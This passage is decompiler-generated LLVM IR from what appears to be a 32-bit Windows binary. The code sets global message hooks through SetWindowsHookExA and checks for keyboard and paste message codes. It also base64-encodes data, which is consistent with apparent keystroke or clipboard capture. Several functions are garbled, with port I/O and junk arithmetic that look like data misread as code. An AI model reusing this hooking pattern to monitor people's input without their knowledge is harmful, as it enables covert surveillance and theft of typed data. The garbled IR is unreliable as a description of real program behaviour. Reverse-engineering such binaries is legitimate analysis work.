  ret i32 %0, !insn.addr !707
}

define i32 @function_4051a8() local_unnamed_addr {
dec_label_pc_4051a8:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !708
}

define i32 @function_4051aa(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_4051aa:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !709
}

define i32 @function_4051b0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4051b0:
  %esp.0.reg2mem = alloca i32, !insn.addr !710
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !711
  store i32 %1, i32* %stack_var_-24, align 4, !insn.addr !711
  %2 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !711
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !712
  %3 = call i32 @function_4071c0(), !insn.addr !713
  %4 = icmp eq i32 %3, 0, !insn.addr !714
  store i32 %2, i32* %esp.0.reg2mem, !insn.addr !715
  br i1 %4, label %dec_label_pc_405214, label %dec_label_pc_4051d1, !insn.addr !715

dec_label_pc_4051d1:                              ; preds = %dec_label_pc_4051b0
  %5 = inttoptr i32 %0 to i8*, !insn.addr !716
  %6 = call i32* @FindWindowExA(i32* null, i32* bitcast ([9 x i8]* @global_var_405238 to i32*), i8* null, i8* %5), !insn.addr !717
  %7 = ptrtoint i32* %6 to i32, !insn.addr !717
  store i32 %7, i32* %stack_var_-44, align 4, !insn.addr !718
  %8 = ptrtoint i32* %stack_var_-44 to i32, !insn.addr !718
  %9 = call i1 @IsWindow(i32* %6), !insn.addr !719
  %10 = icmp eq i1 %9, false, !insn.addr !720
  br i1 %10, label %dec_label_pc_40520f, label %dec_label_pc_4051ec, !insn.addr !721

dec_label_pc_4051ec:                              ; preds = %dec_label_pc_4051d1
  %11 = call i32 @function_407020(), !insn.addr !722
  %12 = call i32 @"@LStrAsg"(), !insn.addr !723
  %13 = call i32 @function_407348(), !insn.addr !724
  store i32 %8, i32* %esp.0.reg2mem, !insn.addr !725
  br label %dec_label_pc_405214, !insn.addr !725

dec_label_pc_40520f:                              ; preds = %dec_label_pc_4051d1
  %14 = call i32 @function_40747c(), !insn.addr !726
  store i32 %8, i32* %esp.0.reg2mem, !insn.addr !726
  br label %dec_label_pc_405214, !insn.addr !726

dec_label_pc_405214:                              ; preds = %dec_label_pc_40520f, %dec_label_pc_4051ec, %dec_label_pc_4051b0
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %15 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !727
  %16 = load i32, i32* %15, align 4, !insn.addr !727
  call void @__writefsdword(i32 0, i32 %16), !insn.addr !728
  %17 = add i32 %esp.0.reload, 8, !insn.addr !729
  %18 = inttoptr i32 %17 to i32*, !insn.addr !729
  store i32 4215345, i32* %18, align 4, !insn.addr !729
  %19 = call i32 @"@LStrClr"(), !insn.addr !730
  ret i32 %19, !insn.addr !731
}

define i32 @function_40522a() local_unnamed_addr {
dec_label_pc_40522a:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !732
  ret i32 %0, !insn.addr !732
}

define i32 @function_40522f() local_unnamed_addr {
dec_label_pc_40522f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !733
}

define i32 @function_405231(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405231:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !734
}

define i32 @function_405235() local_unnamed_addr {
dec_label_pc_405235:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %4 = call i32 @__decompiler_undefined_function_0()
  %5 = bitcast i32* %eax to i8*
  %6 = trunc i32 %4 to i8
  %7 = mul i8 %6, 2, !insn.addr !735
  %8 = inttoptr i32 %4 to i8*, !insn.addr !735
  store i8 %7, i8* %8, align 1, !insn.addr !735
  %9 = add i32 %2, 111, !insn.addr !736
  %10 = inttoptr i32 %9 to i8*, !insn.addr !736
  %11 = load i8, i8* %10, align 1, !insn.addr !736
  %12 = load i32, i32* %eax, align 4, !insn.addr !736
  %13 = trunc i32 %12 to i8, !insn.addr !736
  %14 = add i8 %11, %13, !insn.addr !736
  store i8 %14, i8* %10, align 1, !insn.addr !736
  %15 = trunc i32 %3 to i16, !insn.addr !737
  %16 = call i32 @__asm_insd(i16 %15), !insn.addr !737
  %17 = inttoptr i32 %0 to i32*, !insn.addr !737
  store i32 %16, i32* %17, align 4, !insn.addr !737
  %18 = add i32 %0, 66, !insn.addr !738
  %19 = inttoptr i32 %18 to i64*, !insn.addr !738
  %20 = load i64, i64* %19, align 4, !insn.addr !738
  %21 = call i32 @__asm_bound(i64 %20), !insn.addr !738
  call void @__asm_outsd(i16 %15, i32 %1), !insn.addr !739
  %22 = load i8, i8* %5, align 4, !insn.addr !740
  %23 = load i32, i32* %eax, align 4
  %24 = trunc i32 %23 to i8, !insn.addr !740
  %25 = add i8 %22, %24, !insn.addr !740
  %26 = inttoptr i32 %23 to i8*, !insn.addr !740
  store i8 %25, i8* %26, align 1, !insn.addr !740
  %27 = add i32 %21, -117, !insn.addr !741
  %28 = inttoptr i32 %27 to i8*, !insn.addr !741
  %29 = load i8, i8* %28, align 1, !insn.addr !741
  %30 = trunc i32 %3 to i8, !insn.addr !741
  %31 = add i8 %29, %30, !insn.addr !741
  store i8 %31, i8* %28, align 1, !insn.addr !741
  %32 = call i8 @__asm_in(i16 %15), !insn.addr !742
  %33 = add i32 %21, 16, !insn.addr !743
  %34 = inttoptr i32 %33 to i32*, !insn.addr !743
  %35 = load i32, i32* %34, align 4, !insn.addr !743
  %36 = add i32 %21, 12, !insn.addr !744
  %37 = inttoptr i32 %36 to i32*, !insn.addr !744
  %38 = load i32, i32* %37, align 4, !insn.addr !744
  %39 = add i32 %21, 8, !insn.addr !745
  %40 = inttoptr i32 %39 to i32*, !insn.addr !745
  %41 = load i32, i32* %40, align 4, !insn.addr !745
  %42 = load i32, i32* inttoptr (i32 4227372 to i32*), align 4, !insn.addr !746
  %43 = inttoptr i32 %42 to i32*, !insn.addr !747
  %44 = load i32, i32* %43, align 4, !insn.addr !747
  %45 = icmp eq i32 %44, 0, !insn.addr !747
  %46 = icmp eq i1 %45, false, !insn.addr !748
  %47 = icmp eq i32 %41, 0, !insn.addr !749
  %48 = icmp eq i1 %47, %46
  %49 = icmp eq i32 %38, 1, !insn.addr !750
  %50 = icmp eq i1 %49, %48
  br i1 %50, label %dec_label_pc_40526b, label %dec_label_pc_40529a, !insn.addr !751

dec_label_pc_40526b:                              ; preds = %dec_label_pc_405235
  store i32 %35, i32* %eax, align 4, !insn.addr !752
  %51 = add i32 %35, 4, !insn.addr !753
  %52 = inttoptr i32 %51 to i32*, !insn.addr !753
  %53 = load i32, i32* %52, align 4, !insn.addr !753
  switch i32 %53, label %dec_label_pc_40529a [
    i32 256, label %dec_label_pc_405282
    i32 770, label %dec_label_pc_405293
  ]

dec_label_pc_405282:                              ; preds = %dec_label_pc_40526b
  %54 = call i32 @function_404fc0(i32 %2, i32 %1, i32 %0), !insn.addr !754
  br label %dec_label_pc_40529a, !insn.addr !755

dec_label_pc_405293:                              ; preds = %dec_label_pc_40526b
  %55 = call i32 @function_4050e4(i32 %2, i32 %1, i32 %0), !insn.addr !756
  br label %dec_label_pc_40529a, !insn.addr !756

dec_label_pc_40529a:                              ; preds = %dec_label_pc_405235, %dec_label_pc_40526b, %dec_label_pc_405293, %dec_label_pc_405282
  %56 = load i32, i32* @global_var_4096ac, align 4, !insn.addr !757
  %57 = inttoptr i32 %35 to i32*, !insn.addr !758
  %58 = call i32 @CallNextHookEx(i32* %57, i32 %38, i32 %41, i32 %56), !insn.addr !758
  ret i32 %58, !insn.addr !759
}

define i32 @function_4052b0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4052b0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = load i32, i32* @global_var_40812c, align 4
  %4 = icmp eq i32 %3, 0, !insn.addr !760
  %5 = icmp eq i1 %4, false, !insn.addr !761
  %6 = icmp eq i32 %arg3, 0, !insn.addr !762
  %7 = icmp eq i1 %6, %5
  br i1 %7, label %dec_label_pc_4052ce, label %dec_label_pc_4052e0, !insn.addr !763

dec_label_pc_4052ce:                              ; preds = %dec_label_pc_4052b0
  %8 = add i32 %arg1, 8, !insn.addr !764
  %9 = inttoptr i32 %8 to i32*, !insn.addr !764
  %10 = load i32, i32* %9, align 4, !insn.addr !764
  %11 = icmp eq i32 %10, 2, !insn.addr !765
  %12 = icmp eq i1 %11, false, !insn.addr !766
  br i1 %12, label %dec_label_pc_4052e0, label %dec_label_pc_4052d8, !insn.addr !766

dec_label_pc_4052d8:                              ; preds = %dec_label_pc_4052ce
  %13 = call i32 @function_4051b0(i32 %1, i32 %2, i32 %0), !insn.addr !767
  br label %dec_label_pc_4052e0, !insn.addr !767

dec_label_pc_4052e0:                              ; preds = %dec_label_pc_4052b0, %dec_label_pc_4052d8, %dec_label_pc_4052ce
  %14 = load i32, i32* @global_var_4096b0, align 4, !insn.addr !768
  %15 = inttoptr i32 %arg1 to i32*, !insn.addr !769
  %16 = call i32 @CallNextHookEx(i32* %15, i32 %arg2, i32 %arg3, i32 %14), !insn.addr !769
  ret i32 %16, !insn.addr !770
}

define i32 @function_4052f8() local_unnamed_addr {
dec_label_pc_4052f8:
  %0 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %1 = call i32* @SetWindowsHookExA(i32 0, i32 (i32, i32, i32)* %0, i32* inttoptr (i32 4215364 to i32*), i32 3), !insn.addr !771
  %2 = ptrtoint i32* %1 to i32, !insn.addr !771
  store i32 %2, i32* @global_var_4096ac, align 4, !insn.addr !772
  %3 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %4 = call i32* @SetWindowsHookExA(i32 0, i32 (i32, i32, i32)* %3, i32* inttoptr (i32 4215472 to i32*), i32 4), !insn.addr !773
  %5 = ptrtoint i32* %4 to i32, !insn.addr !773
  store i32 %5, i32* @global_var_4096b0, align 4, !insn.addr !774
  ret i32 %5, !insn.addr !775
}

define i32 @function_405330() local_unnamed_addr {
dec_label_pc_405330:
  %0 = load i32, i32* @global_var_4096ac, align 4, !insn.addr !776
  %1 = inttoptr i32 %0 to i32*, !insn.addr !777
  %2 = call i1 @UnhookWindowsHookEx(i32* %1), !insn.addr !777
  %3 = load i32, i32* @global_var_4096b0, align 4, !insn.addr !778
  %4 = inttoptr i32 %3 to i32*, !insn.addr !779
  %5 = call i1 @UnhookWindowsHookEx(i32* %4), !insn.addr !779
  %6 = sext i1 %5 to i32, !insn.addr !779
  ret i32 %6, !insn.addr !780
}

define i32 @function_405348() local_unnamed_addr {
dec_label_pc_405348:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !781
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !781
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !781
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !782
  %2 = load i32, i32* @global_var_4096a8, align 4, !insn.addr !783
  %3 = add i32 %2, 1, !insn.addr !783
  store i32 %3, i32* @global_var_4096a8, align 4, !insn.addr !783
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !784
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !785
  ret i32 0, !insn.addr !786
}

define i32 @function_40536d() local_unnamed_addr {
dec_label_pc_40536d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !787
  ret i32 %0, !insn.addr !787
}

define i32 @function_405372() local_unnamed_addr {
dec_label_pc_405372:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !788
}

define i32 @function_405374(i32 %arg1) local_unnamed_addr {
dec_label_pc_405374:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !789
}

define i32 @function_405378() local_unnamed_addr {
dec_label_pc_405378:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096a8, align 4, !insn.addr !790
  %2 = add i32 %1, -1, !insn.addr !790
  store i32 %2, i32* @global_var_4096a8, align 4, !insn.addr !790
  ret i32 %0, !insn.addr !791
}

define i32 @function_405383(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405383:
  %storemerge.reg2mem = alloca i32, !insn.addr !792
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %4 = add i32 %3, 1, !insn.addr !792
  %5 = inttoptr i32 %3 to i32*, !insn.addr !792
  store i32 %4, i32* %5, align 4, !insn.addr !792
  %6 = bitcast i32* %eax to i8*
  %7 = load i8, i8* %6, align 4, !insn.addr !793
  %8 = load i32, i32* %eax, align 4
  %9 = trunc i32 %8 to i8, !insn.addr !793
  %10 = add i8 %7, %9, !insn.addr !793
  %11 = inttoptr i32 %8 to i8*, !insn.addr !793
  store i8 %10, i8* %11, align 1, !insn.addr !793
  %12 = load i32, i32* %eax, align 4, !insn.addr !794
  store i32 %arg1, i32* %eax, align 4, !insn.addr !795
  %13 = add i32 %12, 99, !insn.addr !796
  %14 = inttoptr i32 %13 to i64*, !insn.addr !796
  %15 = load i64, i64* %14, align 4, !insn.addr !796
  %16 = call i32 @__asm_bound(i64 %15), !insn.addr !796
  %17 = add i32 %16, -2, !insn.addr !797
  %18 = inttoptr i32 %17 to i16*, !insn.addr !797
  store i16 27241, i16* %18, align 2, !insn.addr !797
  %19 = mul i32 %2, 2, !insn.addr !798
  %20 = add i32 %2, 110, !insn.addr !798
  %21 = add i32 %20, %19, !insn.addr !798
  %22 = inttoptr i32 %21 to i32*, !insn.addr !798
  %23 = load i32, i32* %22, align 4, !insn.addr !798
  %24 = sext i32 %23 to i64, !insn.addr !798
  %25 = mul nsw i64 %24, 111, !insn.addr !798
  %26 = mul i64 %24, 476741369856
  %27 = sdiv i64 %26, 4294967296, !insn.addr !798
  %28 = icmp eq i64 %25, %27, !insn.addr !798
  br i1 %28, label %dec_label_pc_4053b5, label %dec_label_pc_405424, !insn.addr !799

dec_label_pc_4053b5:                              ; preds = %dec_label_pc_405383
  %29 = icmp eq i32 %0, 0, !insn.addr !800
  br i1 %29, label %dec_label_pc_40542c, label %dec_label_pc_4053b9, !insn.addr !801

dec_label_pc_4053b9:                              ; preds = %dec_label_pc_4053b5
  %30 = icmp slt i32 %0, 0, !insn.addr !800
  br i1 %30, label %dec_label_pc_405434, label %dec_label_pc_4053bb, !insn.addr !802

dec_label_pc_4053bb:                              ; preds = %dec_label_pc_4053b9
  %31 = trunc i32 %0 to i8, !insn.addr !800
  %32 = call i8 @llvm.ctpop.i8(i8 %31), !range !547, !insn.addr !800
  %33 = and i8 %32, 1, !insn.addr !800
  %34 = icmp eq i8 %33, 0, !insn.addr !800
  br i1 %34, label %dec_label_pc_4053ed, label %dec_label_pc_4053bd, !insn.addr !803

dec_label_pc_4053bd:                              ; preds = %dec_label_pc_4053bb
  %35 = add i32 %12, -1, !insn.addr !794
  %36 = inttoptr i32 %arg3 to i32*, !insn.addr !804
  %37 = load i32, i32* %36, align 4, !insn.addr !804
  %38 = xor i32 %37, %1, !insn.addr !804
  store i32 %38, i32* %36, align 4, !insn.addr !804
  %39 = add i32 %1, 959985462, !insn.addr !805
  %40 = inttoptr i32 %39 to i32*, !insn.addr !805
  %41 = load i32, i32* %40, align 4, !insn.addr !805
  %42 = xor i32 %41, %1, !insn.addr !805
  %43 = add i32 %16, -38, !insn.addr !806
  %44 = inttoptr i32 %43 to i32*, !insn.addr !806
  store i32 %35, i32* %44, align 4, !insn.addr !806
  %45 = add i32 %16, -42, !insn.addr !807
  %46 = inttoptr i32 %45 to i32*, !insn.addr !807
  store i32 %42, i32* %46, align 4, !insn.addr !807
  %47 = add i32 %16, -22, !insn.addr !808
  %48 = inttoptr i32 %47 to i32*, !insn.addr !808
  store i32 0, i32* %48, align 4, !insn.addr !808
  %49 = add i32 %16, -26, !insn.addr !809
  %50 = inttoptr i32 %49 to i32*, !insn.addr !809
  store i32 0, i32* %50, align 4, !insn.addr !809
  %51 = add i32 %16, -30, !insn.addr !810
  %52 = inttoptr i32 %51 to i32*, !insn.addr !810
  store i32 0, i32* %52, align 4, !insn.addr !810
  %53 = add i32 %16, -34, !insn.addr !811
  %54 = inttoptr i32 %53 to i32*, !insn.addr !811
  store i32 0, i32* %54, align 4, !insn.addr !811
  %55 = add i32 %16, -6, !insn.addr !812
  %56 = inttoptr i32 %55 to i32*, !insn.addr !812
  store i32 %arg3, i32* %56, align 4, !insn.addr !812
  %57 = add i32 %16, -46, !insn.addr !813
  %58 = inttoptr i32 %57 to i32*, !insn.addr !813
  store i32 %17, i32* %58, align 4, !insn.addr !813
  ret i32 0, !insn.addr !813

dec_label_pc_4053ed:                              ; preds = %dec_label_pc_4053bb
  %59 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !814
  %60 = trunc i64 %25 to i32, !insn.addr !798
  %61 = load i32, i32* %eax, align 4, !insn.addr !815
  %62 = add i32 %61, 1, !insn.addr !815
  %63 = mul i32 %59, 8, !insn.addr !816
  %64 = add i32 %59, 48, !insn.addr !816
  %65 = add i32 %64, %63, !insn.addr !816
  %66 = inttoptr i32 %65 to i8*, !insn.addr !816
  %67 = load i8, i8* %66, align 4, !insn.addr !816
  %68 = udiv i32 %62, 256, !insn.addr !816
  %69 = trunc i32 %68 to i8, !insn.addr !816
  %70 = add i8 %67, %69, !insn.addr !816
  store i8 %70, i8* %66, align 4, !insn.addr !816
  call void @__writefsdword(i32 %62, i32 %17), !insn.addr !817
  %71 = call i32 @"@LStrClr"(), !insn.addr !818
  %72 = call i32 @function_4034c8(), !insn.addr !819
  %73 = add i32 %60, -8, !insn.addr !820
  %74 = inttoptr i32 %73 to i32*, !insn.addr !820
  store i32 %72, i32* %74, align 4, !insn.addr !820
  %75 = ashr i32 %72, 31, !insn.addr !821
  %76 = zext i32 %72 to i64, !insn.addr !822
  %77 = zext i32 %75 to i64, !insn.addr !822
  %78 = mul i64 %77, 4294967296, !insn.addr !822
  %79 = or i64 %78, %76, !insn.addr !822
  %80 = sdiv i64 %79, 3, !insn.addr !822
  %81 = trunc i64 %80 to i32, !insn.addr !822
  store i32 %81, i32* %eax, align 4, !insn.addr !822
  %82 = srem i64 %79, 3, !insn.addr !822
  %83 = trunc i64 %82 to i32, !insn.addr !822
  %84 = icmp eq i32 %83, 0, !insn.addr !823
  %85 = icmp eq i1 %84, false, !insn.addr !824
  br i1 %85, label %dec_label_pc_405423, label %dec_label_pc_405416, !insn.addr !824

dec_label_pc_405416:                              ; preds = %dec_label_pc_4053ed
  %86 = load i32, i32* %74, align 4, !insn.addr !825
  %87 = ashr i32 %86, 31, !insn.addr !826
  %88 = zext i32 %86 to i64, !insn.addr !827
  %89 = zext i32 %87 to i64, !insn.addr !827
  %90 = mul i64 %89, 4294967296, !insn.addr !827
  %91 = or i64 %90, %88, !insn.addr !827
  %92 = sdiv i64 %91, 3, !insn.addr !827
  %93 = trunc i64 %92 to i32, !insn.addr !827
  store i32 %93, i32* %storemerge.reg2mem, !insn.addr !828
  br label %dec_label_pc_405430, !insn.addr !828

dec_label_pc_405423:                              ; preds = %dec_label_pc_4053ed
  ret i32 %81, !insn.addr !828

dec_label_pc_405424:                              ; preds = %dec_label_pc_405383
  %94 = load i32, i32* %eax, align 4, !insn.addr !829
  ret i32 %94, !insn.addr !829

dec_label_pc_40542c:                              ; preds = %dec_label_pc_4053b5
  %95 = load i32, i32* %eax, align 4, !insn.addr !830
  %96 = zext i32 %95 to i64, !insn.addr !830
  %97 = zext i32 %arg3 to i64, !insn.addr !830
  %98 = mul i64 %97, 4294967296, !insn.addr !830
  %99 = or i64 %98, %96, !insn.addr !830
  %100 = zext i32 %arg2 to i64, !insn.addr !830
  %101 = sdiv i64 %99, %100, !insn.addr !830
  %102 = trunc i64 %101 to i32, !insn.addr !830
  %103 = add i32 %102, 1, !insn.addr !831
  store i32 %103, i32* %storemerge.reg2mem, !insn.addr !831
  br label %dec_label_pc_405430, !insn.addr !831

dec_label_pc_405430:                              ; preds = %dec_label_pc_405416, %dec_label_pc_40542c
  %storemerge.reload = load i32, i32* %storemerge.reg2mem
  %104 = add i32 %storemerge.reload, -1, !insn.addr !832
  ret i32 %104, !insn.addr !833

dec_label_pc_405434:                              ; preds = %dec_label_pc_4053b9
  %105 = inttoptr i32 %1 to i32*, !insn.addr !834
  %106 = load i32, i32* %105, align 4, !insn.addr !834
  store i32 %106, i32* %stack_var_-16, align 4, !insn.addr !834
  %107 = load i32, i32* %eax, align 4
  %108 = inttoptr i32 %107 to i32*, !insn.addr !835
  %109 = load i32, i32* %108, align 4, !insn.addr !835
  %110 = add i32 %109, %107, !insn.addr !835
  store i32 %110, i32* %108, align 4, !insn.addr !835
  %111 = load i32, i32* %eax, align 4
  %112 = add i32 %111, -119, !insn.addr !836
  %113 = inttoptr i32 %112 to i8*, !insn.addr !836
  %114 = load i8, i8* %113, align 1, !insn.addr !836
  %115 = trunc i32 %111 to i8, !insn.addr !836
  %116 = add i8 %114, %115, !insn.addr !836
  store i8 %116, i8* %113, align 1, !insn.addr !836
  %117 = load i32, i32* %eax, align 4, !insn.addr !837
  ret i32 %117, !insn.addr !837
}

define i32 @function_40543c() local_unnamed_addr {
dec_label_pc_40543c:
  %ebx.0.reg2mem = alloca i32, !insn.addr !838
  %esp.0.reg2mem = alloca i32, !insn.addr !838
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = add i32 %1, -8, !insn.addr !839
  %3 = inttoptr i32 %2 to i32*, !insn.addr !839
  %4 = add i32 %1, -9
  %5 = inttoptr i32 %4 to i8*
  %6 = add i32 %1, -10
  %7 = inttoptr i32 %6 to i8*
  %8 = add i32 %1, -11
  %9 = inttoptr i32 %8 to i8*
  %10 = add i32 %1, -12
  %11 = inttoptr i32 %10 to i8*
  %12 = add i32 %1, -4, !insn.addr !840
  %13 = inttoptr i32 %12 to i32*, !insn.addr !840
  %14 = add i32 %1, -20
  %15 = inttoptr i32 %14 to i32*
  %16 = add i32 %1, -24
  %17 = inttoptr i32 %16 to i32*
  %18 = add i32 %1, -28
  %19 = inttoptr i32 %18 to i32*
  %20 = add i32 %1, -32
  %21 = inttoptr i32 %20 to i32*
  %22 = add i32 %1, -16
  %23 = inttoptr i32 %22 to i32*
  store i32 0, i32* %ebx.0.reg2mem, !insn.addr !838
  br label %dec_label_pc_40543e, !insn.addr !838

dec_label_pc_40543e:                              ; preds = %dec_label_pc_405589, %dec_label_pc_40543c
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %24 = mul i32 %ebx.0.reload, 3, !insn.addr !841
  %25 = add i32 %24, 3, !insn.addr !842
  %26 = load i32, i32* %3, align 4, !insn.addr !839
  %27 = icmp sgt i32 %25, %26, !insn.addr !843
  br i1 %27, label %dec_label_pc_4054de, label %dec_label_pc_40544f, !insn.addr !843

dec_label_pc_40544f:                              ; preds = %dec_label_pc_40543e
  %28 = add i32 %24, %0, !insn.addr !844
  %29 = inttoptr i32 %28 to i8*, !insn.addr !844
  %30 = load i8, i8* %29, align 1, !insn.addr !844
  %31 = udiv i8 %30, 4
  %32 = zext i8 %31 to i32, !insn.addr !845
  %33 = add i32 %32, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !846
  %34 = inttoptr i32 %33 to i8*, !insn.addr !846
  %35 = load i8, i8* %34, align 1, !insn.addr !846
  store i8 %35, i8* %5, align 1, !insn.addr !847
  %36 = load i8, i8* %29, align 1, !insn.addr !848
  %37 = mul i8 %36, 16, !insn.addr !849
  %38 = and i8 %37, 48, !insn.addr !850
  %39 = add i32 %28, 1, !insn.addr !851
  %40 = inttoptr i32 %39 to i8*, !insn.addr !851
  %41 = load i8, i8* %40, align 1, !insn.addr !851
  %42 = udiv i8 %41, 16
  %43 = or i8 %42, %38, !insn.addr !852
  %44 = zext i8 %43 to i32, !insn.addr !852
  %45 = add i32 %44, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !853
  %46 = inttoptr i32 %45 to i8*, !insn.addr !853
  %47 = load i8, i8* %46, align 1, !insn.addr !853
  store i8 %47, i8* %7, align 1, !insn.addr !854
  %48 = load i8, i8* %40, align 1, !insn.addr !855
  %49 = mul i8 %48, 4, !insn.addr !856
  %50 = and i8 %49, 60, !insn.addr !857
  %51 = add i32 %28, 2, !insn.addr !858
  %52 = inttoptr i32 %51 to i8*, !insn.addr !858
  %53 = load i8, i8* %52, align 1, !insn.addr !858
  %54 = udiv i8 %53, 64, !insn.addr !859
  %55 = or i8 %54, %50, !insn.addr !860
  %56 = zext i8 %55 to i32, !insn.addr !860
  %57 = add i32 %56, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !861
  %58 = inttoptr i32 %57 to i8*, !insn.addr !861
  %59 = load i8, i8* %58, align 1, !insn.addr !861
  store i8 %59, i8* %9, align 1, !insn.addr !862
  %60 = and i8 %53, 63, !insn.addr !863
  %61 = zext i8 %60 to i32, !insn.addr !863
  %62 = add i32 %61, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !864
  %63 = inttoptr i32 %62 to i8*, !insn.addr !864
  %64 = load i8, i8* %63, align 1, !insn.addr !864
  store i8 %64, i8* %11, align 1, !insn.addr !865
  br label %dec_label_pc_405589, !insn.addr !866

dec_label_pc_4054de:                              ; preds = %dec_label_pc_40543e
  %65 = add i32 %24, 2, !insn.addr !867
  %66 = icmp sgt i32 %65, %26, !insn.addr !868
  %67 = add i32 %24, %0
  %68 = inttoptr i32 %67 to i8*
  %69 = load i8, i8* %68, align 1
  %70 = udiv i8 %69, 4
  %71 = zext i8 %70 to i32
  %72 = add i32 %71, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32)
  %73 = inttoptr i32 %72 to i8*
  %74 = load i8, i8* %73, align 1
  store i8 %74, i8* %5, align 1
  %75 = load i8, i8* %68, align 1
  br i1 %66, label %dec_label_pc_40554d, label %dec_label_pc_4054e8, !insn.addr !868

dec_label_pc_4054e8:                              ; preds = %dec_label_pc_4054de
  %76 = mul i8 %75, 16, !insn.addr !869
  %77 = and i8 %76, 48, !insn.addr !870
  %78 = add i32 %67, 1, !insn.addr !871
  %79 = inttoptr i32 %78 to i8*, !insn.addr !871
  %80 = load i8, i8* %79, align 1, !insn.addr !871
  %81 = zext i8 %80 to i32, !insn.addr !871
  %82 = udiv i8 %80, 16, !insn.addr !872
  %83 = or i8 %82, %77, !insn.addr !873
  %84 = zext i8 %83 to i32, !insn.addr !873
  %85 = add i32 %84, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !874
  %86 = inttoptr i32 %85 to i8*, !insn.addr !874
  %87 = load i8, i8* %86, align 1, !insn.addr !874
  store i8 %87, i8* %7, align 1, !insn.addr !875
  %88 = mul i32 %81, 4, !insn.addr !876
  %89 = and i32 %88, 60, !insn.addr !877
  %90 = add i32 %89, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !878
  %91 = inttoptr i32 %90 to i8*, !insn.addr !878
  %92 = load i8, i8* %91, align 4, !insn.addr !878
  store i8 %92, i8* %9, align 1, !insn.addr !879
  store i8 61, i8* %11, align 1, !insn.addr !880
  br label %dec_label_pc_405589, !insn.addr !881

dec_label_pc_40554d:                              ; preds = %dec_label_pc_4054de
  %93 = zext i8 %75 to i32, !insn.addr !882
  %94 = mul i32 %93, 16, !insn.addr !883
  %95 = and i32 %94, 48, !insn.addr !884
  %96 = add i32 %95, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !885
  %97 = inttoptr i32 %96 to i8*, !insn.addr !885
  %98 = load i8, i8* %97, align 16, !insn.addr !885
  store i8 %98, i8* %7, align 1, !insn.addr !886
  store i8 61, i8* %9, align 1, !insn.addr !887
  store i8 61, i8* %11, align 1, !insn.addr !888
  br label %dec_label_pc_405589, !insn.addr !888

dec_label_pc_405589:                              ; preds = %dec_label_pc_40554d, %dec_label_pc_4054e8, %dec_label_pc_40544f
  %99 = load i32, i32* %13, align 4, !insn.addr !840
  %100 = inttoptr i32 %99 to i32*, !insn.addr !889
  %101 = load i32, i32* %100, align 4, !insn.addr !889
  %102 = add i32 %esp.0.reload, -4, !insn.addr !889
  %103 = inttoptr i32 %102 to i32*, !insn.addr !889
  store i32 %101, i32* %103, align 4, !insn.addr !889
  %104 = call i32 @"@LStrFromChar"(), !insn.addr !890
  %105 = load i32, i32* %15, align 4, !insn.addr !891
  %106 = add i32 %esp.0.reload, -8, !insn.addr !891
  %107 = inttoptr i32 %106 to i32*, !insn.addr !891
  store i32 %105, i32* %107, align 4, !insn.addr !891
  %108 = call i32 @"@LStrFromChar"(), !insn.addr !892
